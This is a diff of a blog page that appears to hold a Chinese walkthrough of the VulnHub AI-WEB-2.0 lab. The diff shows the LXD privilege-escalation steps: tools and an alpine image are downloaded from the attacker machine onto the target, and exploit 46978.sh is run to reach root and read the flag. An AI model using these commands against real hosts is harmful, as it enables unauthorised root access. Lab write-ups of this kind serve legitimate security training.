@@ -35,7 +35,7 @@
 <meta property="og:image" content="/2020/02/13/AI-WEB-2.0——Workthrough/17.png">
 <meta property="og:image" content="/2020/02/13/AI-WEB-2.0——Workthrough/18.png">
 <meta property="og:image" content="/2020/02/13/AI-WEB-2.0——Workthrough/19.png">
-<meta property="og:updated_time" content="2020-02-13T09:39:13.174Z">
+<meta property="og:updated_time" content="2020-02-13T12:50:25.584Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="AI-WEB-2.0">
 <meta name="twitter:description" content="0X01 靶机环境12攻击机：kali————192.168.0.110靶机：  AI-WEB-1.0————192.168.0.108  [靶机下载地址][https://www.vulnhub.com/entry/ai-web-2,357/]">
@@ -319,47 +319,52 @@ Cred: zxowieoi4sdsadpEClDws1sf</code></p>
 
 <p><img src="/2020/02/13/AI-WEB-2.0——Workthrough/19.png" alt="19"></p>
 <p>显示LXD用户组, LXD是下一代系统容器管理器。 它为用户提供了与虚拟机相似的环境。 即使用Linux容器</p>
+<p>若无法通过<code>id</code>命令看出是<code>lxd</code>存在漏洞,可根据工具扫描得到</p>
+<p>输入以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.110:8000/LinEnum.sh </span><br><span class="line">    chmod 777 LinEnum.sh</span><br><span class="line">    ./LinEnum.sh -r 123.txt</span><br></pre></td></tr></table></figure>
+
+
 </li>
 </ul>
 </li>
 </ul>
-<pre><code>若无法通过`id`命令看出是`lxd`存在漏洞,可根据工具扫描得到
-
-输入以下命令
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.110:8000/LinEnum.sh </span><br><span class="line">chmod 777 LinEnum.sh</span><br><span class="line">./LinEnum.sh -r 123.txt</span><br></pre></td></tr></table></figure>
-
-![21](AI-WEB-2.0——Workthrough/21.png)
+<pre><code>![21](AI-WEB-2.0——Workthrough/21.png)
 
 即可发现`lxd`可能存在漏洞
 
-* 查找`lxd`的漏洞
+查找`lxd`的漏洞
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit lxd</span><br><span class="line">cd /usr/share/exploitdb/exploits/linux/local/</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46978.sh test.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit lxd</span><br><span class="line">    cd /usr/share/exploitdb/exploits/linux/local/</span><br><span class="line">    cp /usr/share/exploitdb/exploits/linux/local/46978.sh test.sh</span><br></pre></td></tr></table></figure>
 
-  ![20](AI-WEB-2.0——Workthrough/20.png)
 
-* 文档中说明了利用的步骤
+![20](AI-WEB-2.0——Workthrough/20.png)
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]</span><br><span class="line"># Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]</span><br><span class="line"># Step 3: Run this script and you will get root [Victim Machine]</span><br><span class="line"># Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</span><br></pre></td></tr></table></figure>
+文档中说明了利用的步骤
 
-  Step 1:下载
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]</span><br><span class="line">    # Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]</span><br><span class="line">    # Step 3: Run this script and you will get root [Victim Machine]</span><br><span class="line">    # Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</span><br></pre></td></tr></table></figure>
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</span><br></pre></td></tr></table></figure>
 
-  Step 2: 建立 alpine
+Step 1:下载
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash build-alpine</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</span><br></pre></td></tr></table></figure>
 
-  Step 3: 在靶机上wget到脚本,再运行脚本
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.110:8000/alpine-v3.11-x86_64-20200213_1716.tar.gz</span><br><span class="line">vi test.sh</span><br><span class="line">chmod 777 test.sh</span><br><span class="line"></span><br><span class="line">#test.sh可能存在格式问题,用vi打开,设置一下</span><br><span class="line">：set ff 然后回车  再重新设置下文件格式：</span><br><span class="line">：set ff=unix 然后保存退出</span><br><span class="line">：wq! 回车</span><br><span class="line"></span><br><span class="line">./test.sh -f alpine-v3.11-x86_64-20200213_1716.tar.gz</span><br></pre></td></tr></table></figure>
+Step 2: 建立 alpine
 
-  提权成功, 查找flag
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash build-alpine</span><br></pre></td></tr></table></figure>
 
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">cd /mnt/root/root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
 
-  ![22](AI-WEB-2.0——Workthrough/22.png)</code></pre>
+Step 3: 在靶机上wget到脚本,再运行脚本
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.110:8000/alpine-v3.11-x86_64-20200213_1716.tar.gz</span><br><span class="line">    vi test.sh</span><br><span class="line">    chmod 777 test.sh</span><br><span class="line">    </span><br><span class="line">    #test.sh可能存在格式问题,用vi打开,设置一下</span><br><span class="line">    ：set ff 然后回车  再重新设置下文件格式：</span><br><span class="line">    ：set ff=unix 然后保存退出</span><br><span class="line">    ：wq! 回车</span><br><span class="line">    </span><br><span class="line">    ./test.sh -f alpine-v3.11-x86_64-20200213_1716.tar.gz</span><br></pre></td></tr></table></figure>
+
+
+提权成功, 查找flag
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">    cd /mnt/root/root</span><br><span class="line">    ls</span><br><span class="line">    cat flag.txt</span><br></pre></td></tr></table></figure>
+
+
+![22](AI-WEB-2.0——Workthrough/22.png)</code></pre>
       
 
       
@@ -607,11 +612,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -619,7 +620,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">CTF靶机系列</a>
+                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
